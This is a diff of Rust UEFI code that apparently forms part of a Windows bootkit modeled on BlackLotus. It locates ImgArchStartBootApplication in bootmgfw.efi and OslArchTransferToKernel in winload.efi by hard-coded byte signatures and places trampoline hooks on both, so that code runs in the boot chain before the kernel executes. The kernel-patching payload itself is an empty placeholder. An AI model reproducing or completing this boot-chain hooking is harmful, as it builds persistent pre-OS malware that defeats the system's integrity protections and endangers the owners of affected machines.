@@ -1,11 +1,12 @@
-use core::ptr::copy_nonoverlapping;
-use core::slice;
+#![allow(dead_code)]
+
 use core::slice::from_raw_parts;
 use uefi::prelude::BootServices;
 use uefi::proto::loaded_image::LoadedImage;
 use uefi::Handle;
 
-use alloc::vec::Vec;
+use crate::boot::utils::{pattern_scan, trampoline_hook, trampoline_unhook};
+
 extern crate alloc;
 
 const JMP_SIZE: usize = 6;
@@ -23,34 +24,38 @@ type fnImgArchStartBootApplication = fn(
 #[allow(non_upper_case_globals)]
 static mut ImgArchStartBootApplication: Option<fnImgArchStartBootApplication> = None;
 
-pub fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
+#[allow(non_camel_case_types)]
+type fnOslArchTransferToKernel = fn(kernel_entry_point: usize, kernel_context: *mut u8);
+
+#[allow(non_upper_case_globals)]
+static mut OslArchTransferToKernel: Option<fnOslArchTransferToKernel> = None;
+
+pub fn setup_hooks(bootmgfw_handle: &Handle, boot_services: &BootServices) {
     let bootmgr = boot_services
-        .open_protocol_exclusive::<LoadedImage>(*bootmgr_handle)
-        .expect("Failed to open handle to uefi bootmgr");
+        .open_protocol_exclusive::<LoadedImage>(*bootmgfw_handle)
+        .expect("Failed to open handle to uefi bootmgfw");
 
     // Returns the base address and the size in bytes of the loaded image.
     let (image_base, image_size) = bootmgr.info();
 
     // Read the data bootmgr_data as bytes
-    let bootmgr_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };
+    let bootmgfw_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };
 
     // Look for the ImgArchStartBootApplication signature in Windows EFI Boot Manager (bootmgfw.efi) and return an offset
-    let img_arch_start_boot_application_offset = pattern_scan(bootmgr_data, "48 8B C4 48 89 58 20 44 89 40 18 48 89 50 10 48 89 48 08 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A9")
-    .expect("Failed to pattern scan").expect("Failed to convert to offset from pattern scan");
+    let img_arch_start_boot_application_offset = pattern_scan(bootmgfw_data, "48 8B C4 48 89 58 20 44 89 40 18 48 89 50 10 48 89 48 08 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A9")
+        .expect("Failed to pattern scan").unwrap();
 
     // Print the address of ImgArchStartBootApplication
     log::info!(
-        "Image Base: {:#x} + Function Offset: {:#x} = {:#x}",
+        "ImgArchStartBootApplication: Image Base: {:#x} + Function Offset: {:#x} = {:#x}",
         image_base as usize,
         img_arch_start_boot_application_offset,
         (image_base as usize + img_arch_start_boot_application_offset)
     );
 
-    // Trampline hook the ImgArchStartBootApplication function to setup winload.efi hook
-    //
-    // ImgArchStartBootApplication in bootmgfw.efi or bootmgr.efi:
-    // This function is commonly hooked by bootkits to catch the moment when the Windows OS loader (winload.efi) is loaded in the memory but still hasn't been executed
-    // – which is the right moment to perform more in-memory patching.
+    // ImgArchStartBootApplication in bootmgfw.efi:
+    // hooked to catch the moment when the Windows OS loader (winload.efi) is loaded in the memory but still hasn't been executed
+    // to perform more in-memory patching.
     // https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
 
     let img_arch_start_boot_application_hook_ptr =
@@ -65,6 +70,7 @@ pub fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
         unsafe { Some(&mut ORIGINAL_BYTES) },
     );
 
+    // Save gateway to call it later
     unsafe {
         ImgArchStartBootApplication =
             Some(core::mem::transmute::<_, fnImgArchStartBootApplication>(
@@ -73,6 +79,7 @@ pub fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
     };
 }
 
+/// ImgArchStartBootApplication hook
 pub fn img_arch_start_boot_application_hook(
     _app_entry: *mut u8,
     _image_base: *mut u8,
@@ -80,64 +87,75 @@ pub fn img_arch_start_boot_application_hook(
     _boot_option: u8,
     _return_arguments: *mut u8,
 ) {
+    // Unhook before we do anything else (restore)
     unsafe {
         trampoline_unhook(
             ImgArchStartBootApplication.unwrap() as *mut u8,
             &ORIGINAL_BYTES,
         )
     };
-}
 
-#[allow(dead_code)]
-fn trampoline_hook(dest: *mut u8, src: *mut u8, original: Option<&mut [u8; 6]>) -> *mut u8 {
-    if let Some(original) = original {
-        original.copy_from_slice(unsafe { slice::from_raw_parts(src, 6) });
-    }
+    // Read the data Windows OS loader winload.efi as bytes
+    let winload_data = unsafe { from_raw_parts(_image_base as *mut u8, _image_size as usize) };
 
+    // Look for the OslArchTransferToKernel signature in Windows OS Loader (winload.efi) and return an offset
+    let osl_arch_transfer_to_kernel_offset = pattern_scan(winload_data, "33 F6 4C 8B E1 4C 8B")
+        .expect("Failed to pattern scan")
+        .unwrap();
+
+    // Print the address of OslArchTransferToKernel
+    log::info!(
+        "OslArchTransferToKernel: Image Base: {:#x} + Function Offset: {:#x} = {:#x}",
+        _image_base as usize,
+        osl_arch_transfer_to_kernel_offset,
+        (_image_base as usize + osl_arch_transfer_to_kernel_offset)
+    );
+
+    // OslArchTransferToKernel in winload.efi:
+    // Hooked to catch the moment when the OS kernel and some of the system drivers are already loaded in the memory, but still haven’t been executed
+    // to perform more in-memory patching
+    // https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
+
+    let osl_arch_transfer_to_kernel_hook_ptr =
+        osl_arch_transfer_to_kernel_hook as *mut () as *mut u8;
+
+    let osl_arch_transfer_to_kernel_address =
+        (_image_base as usize + osl_arch_transfer_to_kernel_offset) as *mut u8;
+
+    let osl_arch_transfer_to_kernel_ptr = trampoline_hook(
+        osl_arch_transfer_to_kernel_hook_ptr,
+        osl_arch_transfer_to_kernel_address,
+        unsafe { Some(&mut ORIGINAL_BYTES) },
+    );
+
+    // Save gateway to call it later
     unsafe {
-        let jmp_size = 6;
-        let hook_bytes = [0xFF, 0x25, 0x00, 0x00, 0x00, 0x00];
-        copy_nonoverlapping(hook_bytes.as_ptr(), src, jmp_size);
+        OslArchTransferToKernel = Some(core::mem::transmute::<_, fnOslArchTransferToKernel>(
+            osl_arch_transfer_to_kernel_ptr,
+        ))
+    };
 
-        let dest_ptr = dest as *mut *mut u8;
-        let dst_jmp_offset = src.offset(6) as *mut *mut u8;
-        dst_jmp_offset.write(dest_ptr as _);
-
-        src
-    }
+    // Call Gateway or to restored execution flow
+    return unsafe {
+        ImgArchStartBootApplication.unwrap()(
+            _app_entry,
+            _image_base,
+            _image_size,
+            _boot_option,
+            _return_arguments,
+        )
+    };
 }
 
-#[allow(dead_code)]
-fn trampoline_unhook(src: *mut u8, original: &[u8; 6]) {
-    unsafe {
-        copy_nonoverlapping(original.as_ptr(), src, 6);
-    }
-}
+/// OslArchTransferToKernel hook
+fn osl_arch_transfer_to_kernel_hook(kernel_entry_point: usize, kernel_context: *mut u8) {
+    // Unhook before we do anything else (restore)
+    unsafe { trampoline_unhook(OslArchTransferToKernel.unwrap() as *mut u8, &ORIGINAL_BYTES) };
 
-/// Convert a combo pattern to bytes without wildcards
-pub fn get_bytes_as_hex(pattern: &str) -> Result<Vec<Option<u8>>, ()> {
-    let mut pattern_bytes = Vec::new();
+    // Do kernel ninja shit below
 
-    for x in pattern.split_whitespace() {
-        match x {
-            "?" => pattern_bytes.push(None),
-            _ => pattern_bytes.push(u8::from_str_radix(x, 16).map(Some).map_err(|_| ())?),
-        }
-    }
+    // Do kernel ninja shit above
 
-    Ok(pattern_bytes)
-}
-
-/// Pattern or Signature scan a region of memory
-pub fn pattern_scan(data: &[u8], pattern: &str) -> Result<Option<usize>, ()> {
-    let pattern_bytes = get_bytes_as_hex(pattern)?;
-
-    let offset = data.windows(pattern_bytes.len()).position(|window| {
-        window
-            .iter()
-            .zip(&pattern_bytes)
-            .all(|(byte, pattern_byte)| pattern_byte.map_or(true, |b| *byte == b))
-    });
-
-    Ok(offset)
+    // Pass the execution to ntoskrnl.exe
+    unsafe { OslArchTransferToKernel.unwrap()(kernel_entry_point, kernel_context) };
 }
